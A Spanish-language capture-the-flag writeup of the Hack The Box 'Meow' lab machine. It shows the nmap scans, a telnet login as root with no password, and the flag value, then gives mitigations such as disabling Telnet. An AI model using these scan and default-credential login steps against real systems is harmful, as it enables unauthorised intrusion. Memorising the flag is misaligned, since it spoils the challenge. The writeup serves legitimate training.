---
title: Meow
os: Linux
dificultad: Very Easy
ip: 10.129.58.25
fecha: 2026-10-17
categoria: Starting Point
estado: completado
tags: [htb, linux, telnet, credenciales-por-defecto]
---

# Meow — Informe de Pentest

> Writeup de la máquina **Meow** de [Hack The Box](https://www.hackthebox.com/). Documento con fines educativos, realizado en un entorno de laboratorio autorizado.

## Información general

| Campo                  | Detalle         |
| ---------------------- | --------------- |
| **Máquina**            | Meow     |
| **Sistema operativo**  | Linux          |
| **Dificultad**         | Very Easy  |
| **Categoría**          | Starting Point    |
| **Dirección IP**       | `10.129.58.25`        |
| **Fecha de resolución**| 2026-10-17        |
| **Autor del informe**  | NiettoFrann      |
| **Estado**             | Completado     |

## Índice

1. [Resumen ejecutivo](#resumen-ejecutivo)
2. [Alcance y metodología](#alcance-y-metodología)
3. [Cadena de ataque](#cadena-de-ataque)
4. [Reconocimiento](#reconocimiento)
5. [Enumeración](#enumeración)
6. [Explotación (Foothold)](#explotación-foothold)
7. [Escalada de privilegios](#escalada-de-privilegios)
8. [Flags](#flags)
9. [Vulnerabilidades identificadas](#vulnerabilidades-identificadas)
10. [Recomendaciones de mitigación](#recomendaciones-de-mitigación)
11. [Lecciones aprendidas](#lecciones-aprendidas)
12. [Herramientas utilizadas](#herramientas-utilizadas)
13. [Referencias](#referencias)

---

## Resumen ejecutivo

Meow es una máquina de dificultad *Very Easy* cuyo único vector de ataque es el servicio **Telnet** (puerto 23). El servicio permite autenticación con el usuario `root` **sin contraseña**, lo que otorga acceso inmediato a una shell con privilegios máximos sin necesidad de ninguna técnica de escalada de privilegios. El impacto es crítico: compromiso total del sistema en segundos, sin explotar ninguna vulnerabilidad de software, solo una mala práctica de configuración (credenciales por defecto / inexistentes en un servicio no cifrado).

## Alcance y metodología

- **Objetivo:** `10.129.58.25` (Meow)
- **Tipo de prueba:** caja negra, sin credenciales previas.
- **Metodología:** Reconocimiento → Enumeración → Explotación → Documentación.
- **Entorno:** conexión a la VPN de HTB desde Linux.

## Cadena de ataque

```text
Ping (host vivo, TTL 63 -> Linux) -> Escaneo de puertos (nmap) -> Puerto 23/tcp abierto (telnet)
  -> Conexión telnet -> Login root sin contraseña -> Shell como root -> Flag user.txt
```

---

## Reconocimiento

### Verificación de conectividad

```bash
ping -c 1 10.129.58.25
```

```text
PING 10.129.58.25 (10.129.58.25) 56(84) bytes of data.
64 bytes from 10.129.58.25: icmp_seq=1 ttl=63 time=238 ms

--- 10.129.58.25 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 238.380/238.380/238.380/0.000 ms
```

El host responde y el TTL (63, cercano al valor por defecto 64 de Linux) indica un sistema operativo **Linux**.

> Evidencia: [`loot/ping.txt`](loot/ping.txt)

### Escaneo de puertos

Escaneo rápido de todos los puertos TCP:

```bash
nmap -p- --min-rate=5000 -T4 -Pn -n 10.129.58.25 -oN loot/puertos.txt
```

```text
PORT      STATE    SERVICE
23/tcp    open     telnet
10281/tcp filtered unknown
31744/tcp filtered unknown
```

> Evidencia: [`loot/puertos.txt`](loot/puertos.txt)

Escaneo detallado del único puerto abierto relevante:

```bash
nmap -p23 -sCV -Pn -n -T4 10.129.58.25 -oN loot/puertos_detallados.txt
```

```text
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> Evidencia: [`loot/puertos_detallados.txt`](loot/puertos_detallados.txt)

| Puerto | Estado | Servicio | Versión       |
| ------ | ------ | -------- | ------------- |
| 23/tcp | open   | telnet   | Linux telnetd |

## Enumeración

### Telnet (puerto 23)

El único servicio accesible es Telnet, un protocolo que transmite toda la información (incluidas credenciales) en **texto plano**. Al tratarse de una máquina introductoria, se probaron usuarios típicos de malas configuraciones por defecto: `admin`, `administrator`, `root`.

```bash
telnet 10.129.58.25
```

Al intentar autenticar con el usuario `root`, el servicio no solicita ninguna contraseña y concede acceso directo a una shell de sistema.

## Explotación (Foothold)

- **Vulnerabilidad:** Cuenta privilegiada (`root`) sin contraseña configurada, expuesta mediante un servicio Telnet sin cifrado.
- **Referencia (CVE / técnica):** CWE-521 (Weak Password Requirements) / CWE-258 (Empty Password in Config File) — no corresponde a un CVE específico, es un error de configuración.
- **Impacto:** Compromiso total e inmediato del sistema (acceso como `root` desde el primer intento de conexión).

### Procedimiento

```bash
telnet 10.129.58.25
# login: root
# (sin contraseña) -> acceso concedido como root
```

Una vez dentro, se confirma el acceso con privilegios de root y se procede a enumerar el sistema de archivos, encontrando la flag en el home del usuario:

```bash
id
cat user.txt
```

```text
b40abdfe23665f766f9c61ecba8a4c19
```

> Evidencia: [`loot/flag.txt`](loot/flag.txt)

Dado que el acceso inicial ya se obtiene con privilegios de `root`, **no es necesaria ninguna fase de escalada de privilegios** ni de estabilización de shell adicional (telnet ya entrega un TTY interactivo).

## Escalada de privilegios

No aplica: el acceso obtenido en el foothold ya corresponde al usuario `root`, por lo que la máquina se considera comprometida por completo (full compromise) desde el primer paso de explotación.

---

## Flags

| Flag       | Valor                              |
| ---------- | ----------------------------------- |
| `user.txt` | `b40abdfe23665f766f9c61ecba8a4c19`  |
| `root.txt` | No corresponde (acceso directo como root) |


## Vulnerabilidades identificadas

| # | Vulnerabilidad | Severidad | CVSS | Componente | Mitigación |
| - | -------------- | --------- | ---- | ---------- | ---------- |
| 1 | Cuenta `root` sin contraseña accesible vía Telnet | Crítica | 9.8 (CVSS 3.1 aprox., AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Servicio Telnet (puerto 23) | Deshabilitar Telnet, usar SSH con autenticación fuerte y deshabilitar el login directo de `root` |

> Severidad: Crítica / Alta / Media / Baja / Informativa.

## Recomendaciones de mitigación

- [x] Deshabilitar el servicio Telnet y sustituirlo por SSH (cifrado en tránsito).
- [x] Establecer contraseñas robustas en todas las cuentas, especialmente en cuentas privilegiadas.
- [x] Deshabilitar el login remoto directo del usuario `root`; usar `sudo` con cuentas nominales.
- [x] Auditar periódicamente los servicios expuestos y cerrar los que no sean estrictamente necesarios.

## Lecciones aprendidas

- Nunca dejar usuarios con nombres típicos (`root`, `admin`, `administrator`) accesibles sin contraseña.
- Siempre establecer una contraseña segura: mínimo 8 caracteres, combinando símbolos, mayúsculas, minúsculas y números.
- No usar Telnet, ya que transmite todo en texto claro y sin cifrar, exponiendo credenciales a cualquiera que capture el tráfico.
- Preferir SSH como servicio de administración remota, al proveer cifrado extremo a extremo.

## Herramientas utilizadas

| Herramienta | Uso                                   |
| ----------- | -------------------------------------- |
| `ping`      | Verificación de conectividad y SO por TTL |
| `nmap`      | Escaneo de puertos y detección de servicios/versiones |
| `telnet`    | Conexión y explotación del servicio Telnet |

## Referencias

- [Página de la máquina en HTB](https://app.hackthebox.com/machines/Meow)
